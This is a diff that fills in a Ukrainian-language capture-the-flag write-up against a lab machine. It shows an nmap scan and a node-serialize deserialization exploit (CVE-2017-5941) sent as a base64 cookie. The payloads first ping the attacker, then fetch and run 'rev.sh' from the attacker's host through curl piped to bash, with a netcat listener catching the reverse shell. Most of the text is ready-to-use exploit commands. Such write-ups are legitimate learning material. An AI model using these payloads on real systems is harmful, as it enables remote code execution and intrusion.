@@ -3,23 +3,51 @@
 
 Складність: Easy
 
-Ціль:
+Ціль: 10.114.131.255
 
 1. Розвідка (Reconnaissance & Enumeration)
 
     1.1. Сканування портів (Nmap):
 
-    1.2. Веб-розвідка:
+   ```bash
+   └─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.131.255 
+   ```
 
-2. Точка входу (Initial Access / Foothold)
+    ![nmap](./img/nmap.png)
 
-    2.1. Експлуатація вразливості:
+    ![cookies](./img/cookies.png)
 
-    2.2. Отримання реверс-шеллу:
+   node-serialize (CVE-2017-5941 ???)  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
-3. Підвищення привілеїв (Privilege Escalation)
+```bash
+─$ echo -n '{"username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"ping -c 2 192.168.130.250\")} ()","isGuest":true,"encoding": "utf-8"}' | base64 -w 0
+eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJwaW5nIC1jIDIgMTkyLjE2OC4xMzAuMjUwXCIpfSAoKSIsImlzR3Vlc3QiOnRydWUsImVuY29kaW5nIjogInV0Zi04In0=
+```
 
-    3.1. Горизонтальне переміщення (www-data -> User): Як ти знайшов дані користувача (паролі в бекапах, скриптах або конфігах).
+```bash
+└─$ curl http://10.114.131.255:8080 -H "Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJwaW5nIC1jIDIgMTkyLjE2OC4xMzAuMjUwXCIpfSAoKSIsImlzR3Vlc3QiOnRydWUsImVuY29kaW5nIjogInV0Zi04In0="
+```
 
-    3.2. Вертикальне підвищення (User -> Root): Твій шлях до "корони". Опис sudo -l, вразливих SUID-файлів або кривих скриптів.
+```bash
+└─$ sudo tcpdump -i tun0 icmp
+```
 
+![cookie_ping_test](./img/cookie_ping_test.png)
+
+![rev_sh](./img/rev_sh.png)
+
+```bash
+└─$ python3 -m http.server 80
+```
+
+```bash
+└─$ nc -nlvp 4444
+```
+
+```bash
+─$ echo -n '{"username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://192.168.130.250/rev.sh | bash\")} ()","isGuest":true,"encoding": "utf-8"}' | base64 -w 0 
+eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzMC4yNTAvcmV2LnNoIHwgYmFzaFwiKX0gKCkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
+─$ curl http://10.114.131.255:8080 -H "Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzMC4yNTAvcmV2LnNoIHwgYmFzaFwiKX0gKCkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9"
+```
+
+![rev_shell](./img/rev_shell.png)
